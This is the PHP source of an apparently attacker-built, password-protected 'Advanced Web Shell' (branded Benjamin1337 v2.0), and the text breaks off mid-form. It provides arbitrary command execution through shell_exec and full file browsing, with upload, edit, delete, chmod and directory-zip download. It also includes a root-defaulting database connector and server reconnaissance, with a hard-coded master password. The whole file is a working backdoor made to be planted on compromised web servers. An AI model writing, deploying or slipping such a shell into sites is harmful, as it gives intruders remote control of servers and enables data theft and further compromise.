<?php
// Session শুরু করার আগে কোন whitespace থাকবে না
session_start();

// Configuration
define('PASSWORD', 'benrootsh');
define('BRAND', 'Benjamin1337');
define('VERSION', 'v2.0');

// Authentication
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    if (isset($_POST['password']) && $_POST['password'] === PASSWORD) {
        $_SESSION['authenticated'] = true;
        $_SESSION['login_ip'] = $_SERVER['REMOTE_ADDR'];
        $_SESSION['login_time'] = time();
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    }
    
    // Login Page
    echo '<!DOCTYPE html><html><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔐 Authentication Required - ' . BRAND . '</title>
    <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
        background: #000;
        color: #00ff00;
        font-family: "Courier New", monospace;
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        background-image: 
            linear-gradient(rgba(0, 255, 0, 0.05) 1px, transparent 1px),
            linear-gradient(90deg, rgba(0, 255, 0, 0.05) 1px, transparent 1px);
        background-size: 30px 30px;
    }
    .login-box {
        background: rgba(10, 10, 10, 0.95);
        border: 2px solid #00ff00;
        padding: 40px;
        width: 400px;
        box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
        position: relative;
        overflow: hidden;
    }
    .login-box::before {
        content: "";
        position: absolute;
        top: -50%;
        left: -50%;
        width: 200%;
        height: 200%;
        background: linear-gradient(45deg, transparent, rgba(0, 255, 0, 0.1), transparent);
        animation: scan 3s linear infinite;
    }
    @keyframes scan {
        0% { transform: translateY(-100%); }
        100% { transform: translateY(100%); }
    }
    h1 {
        text-align: center;
        margin-bottom: 30px;
        color: #00ff00;
        text-shadow: 0 0 10px #00ff00;
    }
    input[type="password"] {
        width: 100%;
        padding: 15px;
        margin: 10px 0;
        background: rgba(0, 0, 0, 0.8);
        border: 1px solid #00ff00;
        color: #00ff00;
        font-family: "Courier New", monospace;
        font-size: 16px;
    }
    button {
        width: 100%;
        padding: 15px;
        background: #00ff00;
        color: #000;
        border: none;
        font-family: "Courier New", monospace;
        font-size: 16px;
        font-weight: bold;
        cursor: pointer;
        transition: 0.3s;
        margin-top: 20px;
    }
    button:hover {
        background: #00cc00;
        box-shadow: 0 0 20px #00ff00;
    }
    .error {
        color: #ff0000;
        text-align: center;
        margin-top: 10px;
        font-size: 14px;
    }
    .terminal-text {
        color: #00ff00;
        font-size: 12px;
        margin-bottom: 20px;
        line-height: 1.5;
    }
    </style>
    </head>
    <body>
    <div class="login-box">
        <h1>⚡ ' . BRAND . ' ' . VERSION . '</h1>
        <div class="terminal-text">
            > Initializing secure connection...<br>
            > Authentication required<br>
            > IP: ' . $_SERVER['REMOTE_ADDR'] . '<br>
            > Time: ' . date('Y-m-d H:i:s') . '
        </div>
        <form method="POST">
            <input type="password" name="password" placeholder="Enter Master Key" required>
            <button type="submit">ACCESS TERMINAL</button>
        </form>';
        
    if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['password'])) {
        echo '<div class="error">✗ ACCESS DENIED - Invalid credentials</div>';
    }
    
    echo '</div>
    <script>
    document.querySelector("input[name=password]").focus();
    </script>
    </body></html>';
    exit;
}

// After authentication
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : (isset($_SESSION['current_dir']) ? $_SESSION['current_dir'] : getcwd());
if (!is_dir($current_dir)) $current_dir = getcwd();
$_SESSION['current_dir'] = $current_dir;

// System Information
$system_info = [
    'server_ip' => $_SERVER['SERVER_ADDR'] ?? '127.0.0.1',
    'server_os' => PHP_OS,
    'php_version' => PHP_VERSION,
    'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
    'document_root' => $_SERVER['DOCUMENT_ROOT'] ?? 'Unknown',
    'disk_total' => disk_total_space('/'),
    'disk_free' => disk_free_space('/'),
    'memory_usage' => memory_get_usage(true),
    'memory_limit' => ini_get('memory_limit'),
    'max_execution_time' => ini_get('max_execution_time'),
    'disabled_functions' => ini_get('disable_functions') ?: 'None',
    'open_basedir' => ini_get('open_basedir') ?: 'None',
    'safe_mode' => ini_get('safe_mode') ? 'ON' : 'OFF'
];

// Functions
function formatBytes($bytes, $precision = 2) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= pow(1024, $pow);
    return round($bytes, $precision) . ' ' . $units[$pow];
}

function getFileIcon($file) {
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    $icons = [
        'php' => '⚡', 'html' => '🌐', 'htm' => '🌐',
        'js' => '📜', 'css' => '🎨', 'json' => '📋',
        'txt' => '📄', 'md' => '📝', 'pdf' => '📕',
        'zip' => '🗜️', 'rar' => '🗜️', 'tar' => '🗜️',
        'gz' => '🗜️', 'jpg' => '🖼️', 'jpeg' => '🖼️',
        'png' => '🖼️', 'gif' => '🖼️', 'bmp' => '🖼️',
        'mp3' => '🎵', 'mp4' => '🎬', 'avi' => '🎬',
        'mov' => '🎬', 'sql' => '🗃️', 'db' => '🗃️',
        'exe' => '⚙️', 'sh' => '🐚', 'py' => '🐍',
        'xml' => '📊', 'csv' => '📊'
    ];
    return $icons[$ext] ?? '📄';
}

function checkPermission($file) {
    $perms = fileperms($file);
    $result = [];
    $result['readable'] = is_readable($file);
    $result['writable'] = is_writable($file);
    $result['executable'] = is_executable($file);
    $result['octal'] = substr(sprintf('%o', $perms), -4);
    return $result;
}

// Handle POST requests
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // File Upload
    if (isset($_FILES['upload_file'])) {
        $target_file = $current_dir . '/' . basename($_FILES['upload_file']['name']);
        if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target_file)) {
            $_SESSION['message'] = '✅ File uploaded successfully!';
        } else {
            $_SESSION['message'] = '❌ Upload failed!';
        }
        header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($current_dir));
        exit;
    }
    
    // Create File/Directory
    if (isset($_POST['create_type'])) {
        $name = trim($_POST['create_name']);
        if ($name) {
            $path = $current_dir . '/' . $name;
            if ($_POST['create_type'] === 'dir') {
                mkdir($path, 0755, true);
                $_SESSION['message'] = '✅ Directory created!';
            } else {
                file_put_contents($path, $_POST['create_content'] ?? '');
                $_SESSION['message'] = '✅ File created!';
            }
        }
        header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($current_dir));
        exit;
    }
    
    // Save Edited File
    if (isset($_POST['save_edit'])) {
        file_put_contents($_POST['file_path'], $_POST['file_content']);
        $_SESSION['message'] = '✅ File saved!';
        header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($current_dir));
        exit;
    }
    
    // Delete File/Directory
    if (isset($_POST['delete_path'])) {
        $path = $_POST['delete_path'];
        if (is_dir($path)) {
            rmdir($path);
        } else {
            unlink($path);
        }
        $_SESSION['message'] = '✅ Deleted!';
        header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($current_dir));
        exit;
    }
    
    // Rename
    if (isset($_POST['rename_old']) && isset($_POST['rename_new'])) {
        rename($_POST['rename_old'], $_POST['rename_new']);
        $_SESSION['message'] = '✅ Renamed!';
        header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($current_dir));
        exit;
    }
    
    // Change Permissions
    if (isset($_POST['chmod_path'])) {
        chmod($_POST['chmod_path'], octdec($_POST['chmod_perms']));
        $_SESSION['message'] = '✅ Permissions changed!';
        header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($current_dir));
        exit;
    }
    
    // Execute Command
    if (isset($_POST['command'])) {
        $output = shell_exec($_POST['command'] . ' 2>&1');
        $_SESSION['command_output'] = $output;
        header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($current_dir) . '&tab=terminal');
        exit;
    }
    
    // Database Connection
    if (isset($_POST['db_action'])) {
        if ($_POST['db_action'] === 'connect') {
            $host = $_POST['db_host'] ?? 'localhost';
            $user = $_POST['db_user'] ?? 'root';
            $pass = $_POST['db_pass'] ?? '';
            $name = $_POST['db_name'] ?? '';
            
            $conn = @mysqli_connect($host, $user, $pass, $name);
            if ($conn) {
                $_SESSION['db_connection'] = [
                    'host' => $host,
                    'user' => $user,
                    'name' => $name,
                    'conn' => $conn
                ];
                $_SESSION['message'] = '✅ Database connected!';
            } else {
                $_SESSION['message'] = '❌ Connection failed: ' . mysqli_connect_error();
            }
        }
        header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($current_dir) . '&tab=database');
        exit;
    }
}

// Handle GET requests
if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (file_exists($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

if (isset($_GET['zip'])) {
    $dir = $_GET['zip'];
    $zipname = basename($dir) . '.zip';
    
    $zip = new ZipArchive();
    if ($zip->open($zipname, ZipArchive::CREATE) === TRUE) {
        $files = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dir),
            RecursiveIteratorIterator::LEAVES_ONLY
        );
        
        foreach ($files as $file) {
            if (!$file->isDir()) {
                $filePath = $file->getRealPath();
                $relativePath = substr($filePath, strlen($dir) + 1);
                $zip->addFile($filePath, $relativePath);
            }
        }
        
        $zip->close();
        
        header('Content-Type: application/zip');
        header('Content-Disposition: attachment; filename="' . $zipname . '"');
        header('Content-Length: ' . filesize($zipname));
        readfile($zipname);
        unlink($zipname);
        exit;
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚡ <?php echo BRAND . ' ' . VERSION; ?> - Advanced Web Shell</title>
    <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    :root {
        --primary: #00ff00;
        --secondary: #007700;
        --danger: #ff3333;
        --warning: #ffcc00;
        --dark: #0a0a0a;
        --darker: #050505;
    }
    body {
        background: var(--dark);
        color: var(--primary);
        font-family: 'Courier New', monospace;
        font-size: 14px;
        line-height: 1.6;
    }
    .container {
        max-width: 100%;
        padding: 10px;
    }
    .header {
        background: var(--darker);
        border-bottom: 2px solid var(--primary);
        padding: 15px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 20px;
        box-shadow: 0 0 20px rgba(0, 255, 0, 0.1);
    }
    .brand {
        font-size: 24px;
        font-weight: bold;
        text-shadow: 0 0 10px var(--primary);
    }
    .brand span { color: var(--warning); }
    .status-bar {
        display: flex;
        gap: 15px;
        font-size: 12px;
    }
    .status-item {
        background: rgba(0, 255, 0, 0.1);
        padding: 5px 10px;
        border-radius: 3px;
        border: 1px solid var(--primary);
    }
    .tabs {
        display: flex;
        background: var(--darker);
        border-bottom: 1px solid var(--primary);
        margin-bottom: 20px;
    }
    .tab {
        padding: 12px 20px;
        cursor: pointer;
        border-right: 1px solid var(--primary);
        transition: 0.3s;
    }
    .tab:hover, .tab.active {
        background: rgba(0, 255, 0, 0.1);
    }
    .tab-content {
        display: none;
        animation: fadeIn 0.5s;
    }
    .tab-content.active {
        display: block;
    }
    @keyframes fadeIn {
        from { opacity: 0; }
        to { opacity: 1; }
    }
    .card {
        background: var(--darker);
        border: 1px solid var(--primary);
        border-radius: 5px;
        padding: 20px;
        margin-bottom: 20px;
        box-shadow: 0 0 15px rgba(0, 255, 0, 0.05);
    }
    .card h3 {
        color: var(--primary);
        margin-bottom: 15px;
        border-bottom: 1px solid var(--secondary);
        padding-bottom: 5px;
    }
    .file-table {
        width: 100%;
        border-collapse: collapse;
    }
    .file-table th {
        background: rgba(0, 255, 0, 0.2);
        padding: 12px;
        text-align: left;
        border: 1px solid var(--primary);
    }
    .file-table td {
        padding: 10px;
        border: 1px solid rgba(0, 255, 0, 0.3);
    }
    .file-table tr:hover {
        background: rgba(0, 255, 0, 0.05);
    }
    .file-icon {
        margin-right: 8px;
        font-size: 16px;
    }
    .path-box {
        background: var(--darker);
        border: 1px solid var(--primary);
        padding: 15px;
        margin-bottom: 20px;
        display: flex;
        gap: 10px;
    }
    .path-box input {
        flex: 1;
        padding: 10px;
        background: #000;
        color: var(--primary);
        border: 1px solid var(--primary);
        font-family: 'Courier New', monospace;
    }
    .btn {
        background: rgba(0, 255, 0, 0.1);
        color: var(--primary);
        border: 1px solid var(--primary);
        padding: 8px 15px;
        cursor: pointer;
        font-family: 'Courier New', monospace;
        transition: 0.3s;
        text-decoration: none;
        display: inline-block;
    }
    .btn:hover {
        background: rgba(0, 255, 0, 0.3);
    }
    .btn-sm { padding: 5px 10px; font-size: 12px; }
    .btn-danger { border-color: var(--danger); color: var(--danger); }
    .btn-warning { border-color: var(--warning); color: var(--warning); }
    .btn-group {
        display: flex;
        gap: 5px;
    }
    .permission-r { color: var(--danger); }
    .permission-w { color: var(--warning); }
    .permission-x { color: var(--primary); }
    .textarea {
        width: 100%;
        height: 300px;
        background: #000;
        color: var(--primary);
        border: 1px solid var(--primary);
        padding: 10px;
        font-family: 'Courier New', monospace;
        resize: vertical;
    }
    .terminal {
        background: #000;
        border: 1px solid var(--primary);
        padding: 15px;
        height: 400px;
        overflow-y: auto;
        font-family: 'Courier New', monospace;
    }
    .terminal-output {
        color: var(--primary);
        white-space: pre-wrap;
        word-break: break-all;
    }
    .terminal-input {
        display: flex;
        margin-top: 10px;
    }
    .terminal-prompt {
        color: var(--primary);
        margin-right: 10px;
    }
    .form-control {
        width: 100%;
        padding: 10px;
        background: #000;
        color: var(--primary);
        border: 1px solid var(--primary);
        font-family: 'Courier New', monospace;
        margin: 5px 0;
    }
    .row {
        display: flex;
        gap: 20px;
        margin-bottom: 20px;
    }
    .col { flex: 1; }
    .message {
        padding: 10px;
        margin-bottom: 20px;
        border-radius: 3px;
        animation: slideIn 0.5s;
    }
    .message.success { background: rgba(0, 255, 0, 0.1); border: 1px solid var(--primary); }
    .message.error { background: rgba(255, 0, 0, 0.1); border: 1px solid var(--danger); }
    @keyframes slideIn {
        from { transform: translateY(-20px); opacity: 0; }
        to { transform: translateY(0); opacity: 1; }
    }
    .tools-grid {
        display: grid;
        grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
        gap: 15px;
        margin-top: 20px;
    }
    .tool-card {
        background: rgba(0, 255, 0, 0.05);
        border: 1px solid var(--primary);
        padding: 15px;
        cursor: pointer;
        transition: 0.3s;
    }
    .tool-card:hover {
        background: rgba(0, 255, 0, 0.1);
        transform: translateY(-2px);
    }
    .progress-bar {
        height: 10px;
        background: #000;
        border: 1px solid var(--primary);
        margin: 10px 0;
        overflow: hidden;
    }
    .progress-fill {
        height: 100%;
        background: var(--primary);
        transition: width 0.5s;
    }
    .info-grid {
        display: grid;
        grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
        gap: 15px;
    }
    .info-item {
        background: rgba(0, 255, 0, 0.05);
        border: 1px solid var(--primary);
        padding: 10px;
    }
    .info-label {
        color: var(--warning);
        font-weight: bold;
    }
    .modal {
        display: none;
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.9);
        z-index: 1000;
        align-items: center;
        justify-content: center;
    }
    .modal-content {
        background: var(--darker);
        border: 2px solid var(--primary);
        width: 90%;
        max-width: 800px;
        max-height: 90vh;
        overflow-y: auto;
        padding: 20px;
    }
    .close-modal {
        float: right;
        cursor: pointer;
        font-size: 20px;
        color: var(--danger);
    }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <div class="brand">
                ⚡ <?php echo BRAND; ?> <span>v2.0</span> - Advanced Web Shell
            </div>
            <div class="status-bar">
                <div class="status-item">🖥️ <?php echo $system_info['server_os']; ?></div>
                <div class="status-item">📡 <?php echo $system_info['server_ip']; ?></div>
                <div class="status-item">⚡ PHP <?php echo $system_info['php_version']; ?></div>
                <div class="status-item">👤 <?php echo $_SESSION['login_ip']; ?></div>
                <div class="status-item">
                    <a href="?logout=1" class="btn btn-sm btn-danger">🚪 Logout</a>
                </div>
            </div>
        </div>

        <!-- Message Display -->
        <?php if (isset($_SESSION['message'])): ?>
            <div class="message success">
                <?php echo $_SESSION['message']; unset($_SESSION['message']); ?>
            </div>
        <?php endif; ?>

        <!-- Tabs -->
        <div class="tabs">
            <div class="tab active" onclick="switchTab('filemanager')">📁 File Manager</div>
            <div class="tab" onclick="switchTab('terminal')">💻 Terminal</div>
            <div class="tab" onclick="switchTab('tools')">🔧 Tools</div>
            <div class="tab" onclick="switchTab('database')">🗄️ Database</div>
            <div class="tab" onclick="switchTab('info')">📊 System Info</div>
            <div class="tab" onclick="switchTab('network')">🌐 Network</div>
            <div class="tab" onclick="switchTab('settings')">⚙️ Settings</div>
        </div>

        <!-- File Manager Tab -->
        <div id="filemanager" class="tab-content active">
            <!-- Path Navigation -->
            <div class="path-box">
                <form method="GET">
                    <input type="text" name="dir" value="<?php echo htmlspecialchars($current_dir); ?>" 
                           placeholder="Enter directory path">
                    <button type="submit" class="btn">Go</button>
                    <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>" class="btn">Parent</a>
                    <a href="?dir=<?php echo urlencode($_SERVER['DOCUMENT_ROOT']); ?>" class="btn">Root</a>
                    <a href="?dir=<?php echo urlencode('/'); ?>" class="btn">/</a>
                </form>
            </div>

            <!-- Quick Stats -->
            <div class="row">
                <div class="col card">
                    <h3>📊 Quick Stats</h3>
                    <div>Disk Usage: <?php 
                        $used = $system_info['disk_total'] - $system_info['disk_free'];
                        $percent = ($used / $system_info['disk_total']) * 100;
                        echo formatBytes($used) . ' / ' . formatBytes($system_info['disk_total']) . ' (' . round($percent, 2) . '%)';
                    ?></div>
                    <div class="progress-bar">
                        <div class="progress-fill" style="width: <?php echo $percent; ?>%"></div>
                    </div>
                    <div>Memory: <?php echo formatBytes($system_info['memory_usage']); ?> / <?php echo $system_info['memory_limit']; ?></div>
                    <div>Safe Mode: <?php echo $system_info['safe_mode']; ?></div>
                </div>
                <div class="col card">
                    <h3>🚀 Quick Actions</h3>
                    <div class="btn-group">
                        <button class="btn" onclick="showModal('uploadModal')">📤 Upload</button>
                        <button class="btn" onclick="showModal('createModal')">➕ Create</button>
                        <button class="btn" onclick="showModal('searchModal')">🔍 Search</button>
                        <button class="btn" onclick="location.href='?zip=<?php echo urlencode($current_dir); ?>'">🗜️ Zip Dir</button>
                    </div>
                </div>
            </div>

            <!-- File Table -->
            <div class="card">
                <h3>📄 Files & Directories</h3>
                <table class="file-table">
                    <thead>
                        <tr>
                            <th>Name</th>
                            <th>Size</th>
                            <th>Modified</th>
                            <th>Permissions</th>
                            <th>Owner/Group</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php
                        $files = scandir($current_dir);
                        foreach ($files as $file) {
                            if ($file == '.' || $file == '..') continue;
                            
                            $full_path = $current_dir . '/' . $file;
                            $is_dir = is_dir($full_path);
                            $perms = checkPermission($full_path);
                            
                            // Get owner/group
                            $owner = fileowner($full_path);
                            $group = filegroup($full_path);
                            if (function_exists('posix_getpwuid')) {
                                $owner_info = @posix_getpwuid($owner);
                                $group_info = @posix_getgrgid($group);
                                $owner_name = $owner_info['name'] ?? $owner;
                                $group_name = $group_info['name'] ?? $group;
                            } else {
                                $owner_name = $owner;
                                $group_name = $group;
                            }
                            
                            echo '<tr>';
                            echo '<td>';
                            echo getFileIcon($file) . ' ';
                            if ($is_dir) {
                                echo '<a href="?dir=' . urlencode($full_path) . '"><b>' . htmlspecialchars($file) . '</b></a>';
                            } else {
                                echo htmlspecialchars($file);
                            }
                            echo '</td>';
                            
                            echo '<td>';
                            if (!$is_dir) {
                                echo formatBytes(filesize($full_path));
                            } else {
                                echo 'DIR';
                            }
                            echo '</td>';
                            
                            echo '<td>' . date('Y-m-d H:i:s', filemtime($full_path)) . '</td>';
                            
                            echo '<td>';
                            echo '<span class="' . ($perms['readable'] ? 'permission-r' : '') . '">R</span>';
                            echo '<span class="' . ($perms['writable'] ? 'permission-w' : '') . '">W</span>';
                            echo '<span class="' . ($perms['executable'] ? 'permission-x' : '') . '">X</span>';
                            echo ' (' . $perms['octal'] . ')';
                            echo '</td>';
                            
                            echo '<td>' . $owner_name . ':' . $group_name . '</td>';
                            
                            echo '<td>';
                            echo '<div class="btn-group">';
                            if (!$is_dir) {
                                echo '<button class="btn btn-sm" onclick="editFile(\'' . urlencode($full_path) . '\')">Edit</button>';
                                echo '<a href="?download=' . urlencode($full_path) . '" class="btn btn-sm">Download</a>';
                            }
                            echo '<button class="btn btn-sm btn-warning" onclick="renameFile(\'' . urlencode($full_path) . '\')">Rename</button>';
                            echo '<button class="btn btn-sm btn-danger" onclick="deleteFile(\'' . urlencode($full_path) . '\')">Delete</button>';
                            if ($is_dir) {
                                echo '<a href="?zip=' . urlencode($full_path) . '" class="btn btn-sm">Zip</a>';
                            }
                            echo '<button class="btn btn-sm" onclick="changePerms(\'' . urlencode($full_path) . '\')">Chmod</button>';
                            echo '</div>';
                            echo '</td>';
                            
                            echo '</tr>';
                        }
                        ?>
                    </tbody>
                </table>
            </div>
        </div>

        <!-- Terminal Tab -->
        <div id="terminal" class="tab-content">
            <div class="card">
                <h3>💻 System Terminal</h3>
                <div class="terminal">
                    <div class="terminal-output" id="termOutput">
                        <?php
                        if (isset($_SESSION['command_output'])) {
                            echo htmlspecialchars($_SESSION['command_output']);
                            unset($_SESSION['command_output']);
                        } else {
                            echo "> Welcome to " . BRAND . " Terminal\n";
                            echo "> Type 'help' for commands\n";
                            echo "> Current dir: " . $current_dir . "\n";
                            echo "> User: " . get_current_user() . "\n";
                        }
                        ?>
                    </div>
                    <form method="POST" class="terminal-input">
                        <span class="terminal-prompt">$</span>
                        <input type="text" name="command" class="form-control" placeholder="Enter command..." 
                               id="commandInput" autocomplete="off">
                        <button type="submit" class="btn">Execute</button>
                    </form>
                </div>
                <div style="margin-top: 15px;">
                    <h4>Common Commands:</h4>
                    <div class="btn-group">
                        <button class="btn btn-sm" onclick="document.getElementById('commandInput').value='pwd'">pwd</button>
                        <button class="btn btn-sm" onclick="document.getElementById('commandInput').value='ls -la'">ls -la</button>
                        <button class="btn btn-sm" onclick="document.getElementById('commandInput').value='whoami'">whoami</button>
                        <button class="btn btn-sm" onclick="document.getElementById('commandInput').value='id'">id</button>
                        <button class="btn btn-sm" onclick="document.getElementById('commandInput').value='uname -a'">uname -a</button>
                        <button class="btn btn-sm" onclick="document.getElementById('commandInput').value='ps aux'">ps aux</button>
                        <button class="btn btn-sm" onclick="document.getElementById('commandInput').value='netstat -tulpn'">netstat</button>
                    </div>
                </div>
            </div>
        </div>

        <!-- Tools Tab -->
        <div id="tools" class="tab-content">
            <div class="card">
                <h3>🔧 Advanced Tools</h3>
                <div class="tools-grid">
                    <div class="tool-card" onclick="execTool('phpinfo')">
                        <h4>⚡ PHP Info</h4>
                        <p>Detailed PHP configuration</p>
                    </div>
                    <div class="tool-card" onclick="execTool('backdoor_scanner')">
                        <h4>🔍 Backdoor Scanner</h4>
                        <p>Scan for suspicious files</p>
                    </div>
                    <div class="tool-card" onclick="execTool('port_scanner')">
                        <h4>📡 Port Scanner</h4>
                        <p>Scan open ports</p>
                    </div>
                    <div class="tool-card" onclick="execTool('mailer_test')">
                        <h4>📧 Mailer Test</h4>
                        <p>Test email functionality</p>
                    </div>
                    <div class="tool-card" onclick="execTool('encoder')">
                        <h4>🔐 Encoder/Decoder</h4>
                        <p>Base64, URL, etc.</p>
                    </div>
                    <div class="tool-card" onclick="execTool('mass_editor')">
                        <h4>📝 Mass Editor</h4>
                        <p>Edit multiple files</p>
                    </div>
                    <div class="tool-card" onclick="execTool('file_checker')">
                        <h4>✅ File Checker</h4>
                        <p>Check file permissions</p>
                    </div>
                    <div class="tool-card" onclick="execTool('backup')">
                        <h4>💾 Backup</h4>
                        <p>Create site backup</p>
                    </div>
                </div>
                
                <div id="toolResult" class="terminal" style="margin-top: 20px; height: 300px;">
                    <!-- Tool results will appear here -->
                </div>
            </div>
        </div>

        <!-- Database Tab -->
        <div id="database" class="tab-content">
            <div class="card">
                <h3>🗄️ Database Manager</h3>
                
                <?php if (!isset($_SESSION['db_connection'])): ?>
                    <!-- Connection Form -->
                    <form method="POST">
                        <input type="hidden" name="db_action" value="connect">
                        <div class="row">
                            <div class="col">
                                <input type="text" name="db_host" class="form-control" placeholder="Host" value="localhost">
                            </div>
                            <div class="col">
                                <input type="text" name="db_user" class="form-control" placeholder="Username" value="root">
                            </div>
                        </div>
                        <div class="row">
                            <div class="col">
                                <input type="password" name="db_pass" class="form-control" placeholder="Password">
                            </div>
                            <div class="col">
                                <input type="text" name="db_name" class="form-control" placeholder="Database Name">
                            </div>
                        </div>
                        <button type="submit" class="btn">Connect</button>
                    </form>
                <?php else: ?>
                    <!-- Database Operations -->
                    <?php
                    $db = $_SESSION['db_connection']['conn'];
                    $db_name = $_SESSION['db_connection']['name'];
                    ?>
                    <div style="margin-bottom: 20px;">
                        <h4>✅ Connected to: <?php echo $db_name; ?></h4>
                        <a href="?db_disconnect=1" class="btn btn-danger">Disconnect</a>
                    </div>
                    
                    <!-- SQL Query Box -->
                    <form method="POST" action="?db_query=1">
                        <textarea name="sql_query" class="textarea" placeholder="SELECT * FROM users;" rows="5"></textarea>
                        <button type="submit" class="btn">Execute Query</button>
                    </form>
                    
                    <!-- Show Tables -->
                    <?php
                    $result = mysqli_query($db, "SHOW TABLES");
                    if ($result && mysqli_num_rows($result) > 0) {
                        echo '<h4 style="margin-top: 20px;">📋 Tables:</h4>';
                        echo '<div class="btn-group">';
                        while ($row = mysqli_fetch_array($result)) {
                            echo '<button class="btn btn-sm" onclick="showTable(\'' . $row[0] . '\')">' . $row[0] . '</button>';
                        }
                        echo '</div>';
                    }
                    ?>
                <?php endif; ?>
            </div>
        </div>

        <!-- System Info Tab -->
        <div id="info" class="tab-content">
            <div class="card">
                <h3>📊 System Information</h3>
                <div class="info-grid">
                    <?php foreach ($system_info as $key => $value): ?>
                        <div class="info-item">
                            <span class="info-label"><?php echo ucwords(str_replace('_', ' ', $key)); ?>:</span><br>
                            <span><?php echo is_numeric($value) ? formatBytes($value) : $value; ?></span>
                        </div>
                    <?php endforeach; ?>
                </div>
                
                <!-- PHP Extensions -->
                <h3 style="margin-top: 20px;">🧩 PHP Extensions</h3>
                <div style="display: flex; flex-wrap: wrap; gap: 10px; margin-top: 10px;">
                    <?php
                    $extensions = get_loaded_extensions();
                    sort($extensions);
                    foreach ($extensions as $ext) {
                        echo '<span class="btn btn-sm">' . $ext . '</span>';
                    }
                    ?>
                </div>
            </div>
        </div>

        <!-- Network Tab -->
        <div id="network" class="tab-content">
            <div class="card">
                <h3>🌐 Network Tools</h3>
                <div class="row">
                    <div class="col">
                        <h4>🔗 Check Connection</h4>
                        <form method="POST" onsubmit="return checkConnection(this)">
                            <input type="text" name="check_url" class="form-control" placeholder="https://example.com">
                            <button type="submit" class="btn">Check</button>
                        </form>
                    </div>
                    <div class="col">
                        <h4>📡 DNS Lookup</h4>
                        <form method="POST" onsubmit="return dnsLookup(this)">
                            <input type="text" name="dns_host" class="form-control" placeholder="example.com">
                            <button type="submit" class="btn">Lookup</button>
                        </form>
                    </div>
                </div>
                
                <!-- Network Information -->
                <h4 style="margin-top: 20px;">📊 Network Info</h4>
                <div class="info-grid">
                    <div class="info-item">
                        <span class="info-label">Server IP:</span><br>
                        <span><?php echo $_SERVER['SERVER_ADDR'] ?? 'N/A'; ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Your IP:</span><br>
                        <span><?php echo $_SERVER['REMOTE_ADDR']; ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Server Port:</span><br>
                        <span><?php echo $_SERVER['SERVER_PORT'] ?? 'N/A'; ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Protocol:</span><br>
                        <span><?php echo $_SERVER['SERVER_PROTOCOL'] ?? 'N/A'; ?></span>
                    </div>
                </div>
            </div>
        </div>

        <!-- Settings Tab -->
        <div id="settings" class="tab-content">
            <div class="card">
                <h3>⚙️ Settings</h3>
                <form method="POST">
                    <h4>🔧 Shell Settings</h4>
                    <div>
                        <label><input type="checkbox" name="show_hidden" checked> Show Hidden Files</label><br>
                        <label><input type="checkbox" name="confirm_delete" checked> Confirm Before Delete</label><br>
                        <label><input type="checkbox" name="enable_commands" checked> Enable Command Execution</label>
                    </div>
                    
                    <h4 style="margin-top: 20px;">🎨 Theme</h4>
                    <select class="form-control" onchange="changeTheme(this.value)">
                        <option value="green">Green (Default)</option>
                        <option value="blue">Blue</option>
                        <option value="red">Red</option>
                        <option value="purple">Purple</option>
                    </select>
                    
                    <button type="submit" class="btn" style="margin-top: 20px;">Save Settings</button>
                </form>
            </div>
        </div>
    </div>

    <!-- Modals -->
    <div id="uploadModal" class="modal">
        <div class="modal-content">
            <span class="close-modal" onclick="hideModal('uploadModal')">&times;</span>
            <h3>📤 Upload Files</h3>
            <form method="POST" enctype="multipart/form-data">
                <input type="file" name="upload_file" class="form-control">
                <button type="submit" class="btn">Upload</button>
            </form>
        </div>
    </div>

    <div id="createModal" class="modal">
        <div class="modal-content">
            <span class="close-modal" onclick="hideModal('createModal')">&times;</span>
            <h3>➕ Create New</h3>
            <form method="POST">
                <input type="text" name="create_name" class="form-control" placeholder="Name">
                <select name="create_type" class="form-control">
                    <option value="file">File</option>
                    <option value="dir">Directory</option>
                </select>
